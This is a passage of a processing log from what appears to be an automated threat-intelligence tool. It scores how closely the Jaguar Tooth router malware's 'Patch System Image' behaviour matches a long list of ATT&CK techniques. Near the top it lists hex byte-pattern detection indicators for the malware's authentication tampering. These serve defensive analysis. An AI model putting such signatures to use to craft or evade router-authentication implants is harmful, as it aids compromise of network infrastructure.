Cisco Routers - Cisco Blogs.html'}, page_content='You can read their findings and recommendations in theira blog postalso out today.Infrastructure devices are critical components of any organization’s IT infrastructure.\n\nThese devices are often the first line of defense against cyber-attacks and can help prevent unauthorized access to your network.')]
[2025-04-08 17:34:52,118 INFO] ++ Indicators computed for action: Modify Authentication Process as used by the malware. The indicators are:
['The content contains "| 2 b   0 6   0 1   0 4   0 1   0 9   0 9   5 f   0 1   0 2   0 4   0 1   0 3 |".', 'The content contains "| 0 3   8 1   6 0   0 0   0 8 |".', 'The content contains "| 2 4   0 2   0 0   0 1 |".']
[2025-04-08 17:34:53,964 INFO] ++ Removed pre-condition: 
The target device is vulnerable to exploitation by the malware.
, due to similarity with: 
The malware has access to the target device's memory.
 (tensor([[0.8065]]))
[2025-04-08 17:35:12,267 INFO] ++ Removed post-condition: 
Snort alert logs indicating Jaguar Tooth payload deployment
, due to similarity with: 
Network traffic containing Jaguar Tooth payload
 (tensor([[0.7008]]))
[2025-04-08 17:35:24,363 INFO] + Processing action: Modify System Image: Patch System Image as used by the malware
[2025-04-08 17:35:24,643 INFO] ++ Embedding computed for: Modify System Image: Patch System Image as used by the malware. The vector has shape: (384,)
[2025-04-08 17:35:24,781 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [abuse elevation control mechanism]: tensor([[0.3293]])
[2025-04-08 17:35:24,935 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [abuse elevation control mechanism: setuid and setgid]: tensor([[0.3851]])
[2025-04-08 17:35:25,088 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [abuse elevation control mechanism: bypass user account control]: tensor([[0.3660]])
[2025-04-08 17:35:25,230 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [abuse elevation control mechanism: sudo and sudo caching]: tensor([[0.3502]])
[2025-04-08 17:35:25,327 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [abuse elevation control mechanism: elevated execution with prompt]: tensor([[0.3617]])
[2025-04-08 17:35:25,499 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [abuse elevation control mechanism: temporary elevated cloud access]: tensor([[0.2617]])
[2025-04-08 17:35:25,706 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [abuse elevation control mechanism: tcc manipulation]: tensor([[0.3337]])
[2025-04-08 17:35:25,885 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [access token manipulation]: tensor([[0.3540]])
[2025-04-08 17:35:26,042 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [access token manipulation: token impersonation/theft]: tensor([[0.3350]])
[2025-04-08 17:35:26,254 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [access token manipulation: create process with token]: tensor([[0.3326]])
[2025-04-08 17:35:26,373 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [access token manipulation: make and impersonate token]: tensor([[0.3632]])
[2025-04-08 17:35:26,491 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [access token manipulation: parent pid spoofing]: tensor([[0.3486]])
[2025-04-08 17:35:26,621 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [access token manipulation: sid-history injection]: tensor([[0.3703]])
[2025-04-08 17:35:26,909 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [bits jobs]: tensor([[0.3128]])
[2025-04-08 17:35:27,070 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [build image on host]: tensor([[0.3744]])
[2025-04-08 17:35:27,211 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [debugger evasion]: tensor([[0.3278]])
[2025-04-08 17:35:27,367 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [deobfuscate/decode files or information]: tensor([[0.3678]])
[2025-04-08 17:35:27,462 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [deploy container]: tensor([[0.3456]])
[2025-04-08 17:35:27,534 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [direct volume access]: tensor([[0.1796]])
[2025-04-08 17:35:27,615 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [domain or tenant policy modification]: tensor([[0.3226]])
[2025-04-08 17:35:27,761 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [domain or tenant policy modification: group policy modification]: tensor([[0.3341]])
[2025-04-08 17:35:27,970 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [domain or tenant policy modification: trust modification]: tensor([[0.2839]])
[2025-04-08 17:35:28,118 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [execution guardrails]: tensor([[0.3897]])
[2025-04-08 17:35:28,237 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [execution guardrails: environmental keying]: tensor([[0.3376]])
[2025-04-08 17:35:28,369 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [execution guardrails: mutual exclusion]: tensor([[0.3372]])
[2025-04-08 17:35:28,538 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [exploitation for defense evasion]: tensor([[0.4577]])
[2025-04-08 17:35:28,643 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [file and directory permissions modification]: tensor([[0.2561]])
[2025-04-08 17:35:28,805 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [file and directory permissions modification: windows file and directory permissions modification]: tensor([[0.2830]])
[2025-04-08 17:35:29,037 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [file and directory permissions modification: linux and mac file and directory permissions modification]: tensor([[0.2631]])
[2025-04-08 17:35:29,212 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts]: tensor([[0.4899]])
[2025-04-08 17:35:29,365 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: hidden files and directories]: tensor([[0.3469]])
[2025-04-08 17:35:29,586 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: hidden users]: tensor([[0.3830]])
[2025-04-08 17:35:29,717 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: hidden window]: tensor([[0.3962]])
[2025-04-08 17:35:29,865 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: ntfs file attributes]: tensor([[0.1931]])
[2025-04-08 17:35:30,055 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: hidden file system]: tensor([[0.2575]])
[2025-04-08 17:35:30,233 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: run virtual instance]: tensor([[0.3941]])
[2025-04-08 17:35:30,334 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: vba stomping]: tensor([[0.3333]])
[2025-04-08 17:35:30,523 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: email hiding rules]: tensor([[0.1861]])
[2025-04-08 17:35:30,751 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: resource forking]: tensor([[0.3807]])
[2025-04-08 17:35:30,847 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: process argument spoofing]: tensor([[0.3182]])
[2025-04-08 17:35:30,998 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: ignore process interrupts]: tensor([[0.2545]])
[2025-04-08 17:35:31,153 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: file/path exclusions]: tensor([[0.3413]])
[2025-04-08 17:35:31,278 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow]: tensor([[0.4079]])
[2025-04-08 17:35:31,486 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: dll search order hijacking]: tensor([[0.3445]])
[2025-04-08 17:35:31,728 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: dll side-loading]: tensor([[0.2415]])
[2025-04-08 17:35:31,895 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: dylib hijacking]: tensor([[0.2563]])
[2025-04-08 17:35:32,007 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: executable installer file permissions weakness]: tensor([[0.4674]])
[2025-04-08 17:35:32,158 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: dynamic linker hijacking]: tensor([[0.3071]])
[2025-04-08 17:35:32,242 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: path interception by path environment variable]: tensor([[0.3275]])
[2025-04-08 17:35:32,378 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: path interception by search order hijacking]: tensor([[0.3556]])
[2025-04-08 17:35:32,518 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: path interception by unquoted path]: tensor([[0.2795]])
[2025-04-08 17:35:32,739 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: services file permissions weakness]: tensor([[0.5119]])
[2025-04-08 17:35:32,908 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: services registry permissions weakness]: tensor([[0.4701]])
[2025-04-08 17:35:33,042 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: cor_profiler]: tensor([[0.3181]])
[2025-04-08 17:35:33,194 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: kernelcallbacktable]: tensor([[0.4415]])
[2025-04-08 17:35:33,307 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: appdomainmanager]: tensor([[0.3256]])
[2025-04-08 17:35:33,403 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses]: tensor([[0.3509]])
[2025-04-08 17:35:33,551 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses: disable or modify tools]: tensor([[0.3933]])
[2025-04-08 17:35:33,745 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses: disable windows event logging]: tensor([[0.3290]])
[2025-04-08 17:35:33,954 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses: impair command history logging]: tensor([[0.2436]])
[2025-04-08 17:35:34,079 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses: disable or modify system firewall]: tensor([[0.4480]])
[2025-04-08 17:35:34,173 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses: indicator blocking]: tensor([[0.3370]])
[2025-04-08 17:35:34,236 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses: disable or modify cloud firewall]: tensor([[0.2984]])
[2025-04-08 17:35:34,323 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses: disable or modify cloud logs]: tensor([[0.2626]])
[2025-04-08 17:35:34,454 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses: safe mode boot]: tensor([[0.3173]])
[2025-04-08 17:35:34,621 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses: downgrade attack]: tensor([[0.4182]])
[2025-04-08 17:35:34,872 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses: spoof security alerting]: tensor([[0.3143]])
[2025-04-08 17:35:35,028 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses: disable or modify linux audit system]: tensor([[0.3617]])
[2025-04-08 17:35:35,159 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impersonation]: tensor([[0.2489]])
[2025-04-08 17:35:35,235 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indicator removal]: tensor([[0.3676]])
[2025-04-08 17:35:35,403 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indicator removal: clear windows event logs]: tensor([[0.3074]])
[2025-04-08 17:35:35,569 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indicator removal: clear linux or mac system logs]: tensor([[0.3470]])
[2025-04-08 17:35:35,860 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indicator removal: clear command history]: tensor([[0.3248]])
[2025-04-08 17:35:36,040 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indicator removal: file deletion]: tensor([[0.3751]])
[2025-04-08 17:35:36,183 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indicator removal: network share connection removal]: tensor([[0.2881]])
[2025-04-08 17:35:36,264 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indicator removal: timestomp]: tensor([[0.2645]])
[2025-04-08 17:35:36,395 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indicator removal: clear network connection history and configurations]: tensor([[0.3761]])
[2025-04-08 17:35:36,542 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indicator removal: clear mailbox data]: tensor([[0.2250]])
[2025-04-08 17:35:36,654 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indicator removal: clear persistence]: tensor([[0.3536]])
[2025-04-08 17:35:36,832 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indicator removal: relocate malware]: tensor([[0.4529]])
[2025-04-08 17:35:37,034 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indirect command execution]: tensor([[0.1804]])
[2025-04-08 17:35:37,159 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [masquerading]: tensor([[0.4023]])
[2025-04-08 17:35:37,256 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [masquerading: invalid code signature]: tensor([[0.3610]])
[2025-04-08 17:35:37,387 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [masquerading: right-to-left override]: tensor([[0.3110]])
[2025-04-08 17:35:37,577 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [masquerading: rename system utilities]: tensor([[0.4256]])
[2025-04-08 17:35:37,702 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [masquerading: masquerade task or service]: tensor([[0.3281]])
[2025-04-08 17:35:37,924 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [masquerading: match legitimate name or location]: tensor([[0.4188]])
[2025-04-08 17:35:38,078 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [masquerading: space after filename]: tensor([[0.3225]])
[2025-04-08 17:35:38,235 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [masquerading: double file extension]: tensor([[0.1151]])
[2025-04-08 17:35:38,394 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [masquerading: masquerade file type]: tensor([[0.2499]])
[2025-04-08 17:35:38,473 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [masquerading: break process trees]: tensor([[0.3689]])
[2025-04-08 17:35:38,582 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [masquerading: masquerade account name]: tensor([[0.1725]])
[2025-04-08 17:35:38,769 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify authentication process]: tensor([[0.4857]])
[2025-04-08 17:35:38,997 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify authentication process: domain controller authentication]: tensor([[0.5034]])
[2025-04-08 17:35:39,089 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify authentication process: password filter dll]: tensor([[0.4741]])
[2025-04-08 17:35:39,171 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify authentication process: pluggable authentication modules]: tensor([[0.3948]])
[2025-04-08 17:35:39,259 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify authentication process: network device authentication]: tensor([[0.6454]])
[2025-04-08 17:35:39,330 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify authentication process: reversible encryption]: tensor([[0.3612]])
[2025-04-08 17:35:39,402 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify authentication process: multi-factor authentication]: tensor([[0.4161]])
[2025-04-08 17:35:39,491 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify authentication process: hybrid identity]: tensor([[0.4861]])
[2025-04-08 17:35:39,589 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify authentication process: network provider dll]: tensor([[0.3794]])
[2025-04-08 17:35:39,680 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify authentication process: conditional access policies]: tensor([[0.3946]])
[2025-04-08 17:35:39,768 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify cloud compute infrastructure]: tensor([[0.4046]])
[2025-04-08 17:35:39,855 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify cloud compute infrastructure: create snapshot]: tensor([[0.3304]])
[2025-04-08 17:35:39,945 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify cloud compute infrastructure: create cloud instance]: tensor([[0.2640]])
[2025-04-08 17:35:40,036 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify cloud compute infrastructure: delete cloud instance]: tensor([[0.3655]])
[2025-04-08 17:35:40,124 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify cloud compute infrastructure: revert cloud instance]: tensor([[0.3755]])
[2025-04-08 17:35:40,214 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify cloud compute infrastructure: modify cloud compute configurations]: tensor([[0.2915]])
[2025-04-08 17:35:40,296 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify cloud resource hierarchy]: tensor([[0.3524]])
[2025-04-08 17:35:40,379 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify registry]: tensor([[0.4612]])
[2025-04-08 17:35:40,468 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify system image]: tensor([[0.5955]])
[2025-04-08 17:35:40,561 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify system image: patch system image]: tensor([[0.6984]])
[2025-04-08 17:35:40,638 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify system image: downgrade system image]: tensor([[0.6273]])
[2025-04-08 17:35:40,772 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [network boundary bridging]: tensor([[0.1928]])
[2025-04-08 17:35:40,908 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [network boundary bridging: network address translation traversal]: tensor([[0.2758]])
[2025-04-08 17:35:41,069 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information]: tensor([[0.3636]])
[2025-04-08 17:35:41,208 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: binary padding]: tensor([[0.4316]])
[2025-04-08 17:35:41,329 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: software packing]: tensor([[0.3544]])
[2025-04-08 17:35:41,591 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: steganography]: tensor([[0.2174]])
[2025-04-08 17:35:41,714 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: compile after delivery]: tensor([[0.2868]])
[2025-04-08 17:35:41,965 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: indicator removal from tools]: tensor([[0.4487]])
[2025-04-08 17:35:42,205 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: html smuggling]: tensor([[0.2132]])
[2025-04-08 17:35:42,365 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: dynamic api resolution]: tensor([[0.3668]])
[2025-04-08 17:35:42,534 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: stripped payloads]: tensor([[0.2593]])
[2025-04-08 17:35:42,709 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: embedded payloads]: tensor([[0.3117]])
[2025-04-08 17:35:42,821 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: command obfuscation]: tensor([[0.2473]])
[2025-04-08 17:35:42,989 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: fileless storage]: tensor([[0.2270]])
[2025-04-08 17:35:43,173 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: lnk icon smuggling]: tensor([[0.3040]])
[2025-04-08 17:35:43,324 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: encrypted/encoded file]: tensor([[0.2914]])
[2025-04-08 17:35:43,510 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: polymorphic code]: tensor([[0.3566]])
[2025-04-08 17:35:43,743 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [plist file modification]: tensor([[0.3783]])
[2025-04-08 17:35:43,920 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [pre-os boot]: tensor([[0.4668]])
[2025-04-08 17:35:44,047 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [pre-os boot: system firmware]: tensor([[0.3333]])
[2025-04-08 17:35:44,188 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [pre-os boot: component firmware]: tensor([[0.4807]])
[2025-04-08 17:35:44,298 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [pre-os boot: bootkit]: tensor([[0.4020]])
[2025-04-08 17:35:44,536 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [pre-os boot: rommonkit]: tensor([[0.4992]])
[2025-04-08 17:35:44,694 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [pre-os boot: tftp boot]: tensor([[0.3316]])
[2025-04-08 17:35:44,896 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection]: tensor([[0.3778]])
[2025-04-08 17:35:45,060 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: dynamic-link library injection]: tensor([[0.3725]])
[2025-04-08 17:35:45,158 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: portable executable injection]: tensor([[0.3803]])
[2025-04-08 17:35:45,274 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: thread execution hijacking]: tensor([[0.4268]])
[2025-04-08 17:35:45,485 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: asynchronous procedure call]: tensor([[0.3378]])
[2025-04-08 17:35:45,695 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: thread local storage]: tensor([[0.3599]])
[2025-04-08 17:35:45,840 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: ptrace system calls]: tensor([[0.3904]])
[2025-04-08 17:35:46,045 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: proc memory]: tensor([[0.4108]])
[2025-04-08 17:35:46,199 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: extra window memory injection]: tensor([[0.3592]])
[2025-04-08 17:35:46,316 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: process hollowing]: tensor([[0.3595]])
[2025-04-08 17:35:46,534 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: process doppelgänging]: tensor([[0.4234]])
[2025-04-08 17:35:46,730 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: vdso hijacking]: tensor([[0.3955]])
[2025-04-08 17:35:47,006 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: listplanting]: tensor([[0.4209]])
[2025-04-08 17:35:47,140 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [reflective code loading]: tensor([[0.2588]])
[2025-04-08 17:35:47,278 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [rogue domain controller]: tensor([[0.2757]])
[2025-04-08 17:35:47,366 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [rootkit]: tensor([[0.4777]])
[2025-04-08 17:35:47,549 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [subvert trust controls]: tensor([[0.4208]])
[2025-04-08 17:35:47,808 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [subvert trust controls: gatekeeper bypass]: tensor([[0.3935]])
[2025-04-08 17:35:48,046 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [subvert trust controls: code signing]: tensor([[0.3100]])
[2025-04-08 17:35:48,219 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [subvert trust controls: sip and trust provider hijacking]: tensor([[0.3721]])
[2025-04-08 17:35:48,360 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [subvert trust controls: install root certificate]: tensor([[0.3119]])
[2025-04-08 17:35:48,534 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [subvert trust controls: mark-of-the-web bypass]: tensor([[0.3928]])
[2025-04-08 17:35:48,689 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [subvert trust controls: code signing policy modification]: tensor([[0.3515]])
[2025-04-08 17:35:48,869 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution]: tensor([[0.4331]])
[2025-04-08 17:35:49,094 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: compiled html file]: tensor([[0.3696]])
[2025-04-08 17:35:49,234 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: control panel]: tensor([[0.4095]])
[2025-04-08 17:35:49,403 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: cmstp]: tensor([[0.3515]])
[2025-04-08 17:35:49,544 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: installutil]: tensor([[0.3449]])
[2025-04-08 17:35:49,691 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: mshta]: tensor([[0.3994]])
[2025-04-08 17:35:49,909 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: msiexec]: tensor([[0.4095]])
[2025-04-08 17:35:50,072 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: odbcconf]: tensor([[0.2296]])
[2025-04-08 17:35:50,207 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: regsvcs/regasm]: tensor([[0.4583]])
[2025-04-08 17:35:50,400 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: regsvr32]: tensor([[0.4516]])
[2025-04-08 17:35:50,604 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: rundll32]: tensor([[0.3089]])
[2025-04-08 17:35:50,703 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: verclsid]: tensor([[0.4150]])
[2025-04-08 17:35:50,860 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: mavinject]: tensor([[0.4448]])
[2025-04-08 17:35:51,057 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: mmc]: tensor([[0.4091]])
[2025-04-08 17:35:51,197 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: electron applications]: tensor([[0.1672]])
[2025-04-08 17:35:51,303 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system script proxy execution]: tensor([[0.3734]])
[2025-04-08 17:35:51,492 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system script proxy execution: pubprn]: tensor([[0.2622]])
[2025-04-08 17:35:51,719 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system script proxy execution: syncappvpublishingserver]: tensor([[0.3361]])
[2025-04-08 17:35:51,851 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [template injection]: tensor([[0.3057]])
[2025-04-08 17:35:52,040 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [traffic signaling]: tensor([[0.2094]])
[2025-04-08 17:35:52,230 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [traffic signaling: port knocking]: tensor([[0.2208]])
[2025-04-08 17:35:52,498 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [traffic signaling: socket filters]: tensor([[0.1820]])
[2025-04-08 17:35:52,721 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [trusted developer utilities proxy execution]: tensor([[0.3196]])
[2025-04-08 17:35:52,851 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [trusted developer utilities proxy execution: msbuild]: tensor([[0.3280]])
[2025-04-08 17:35:53,020 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [trusted developer utilities proxy execution: clickonce]: tensor([[0.3747]])
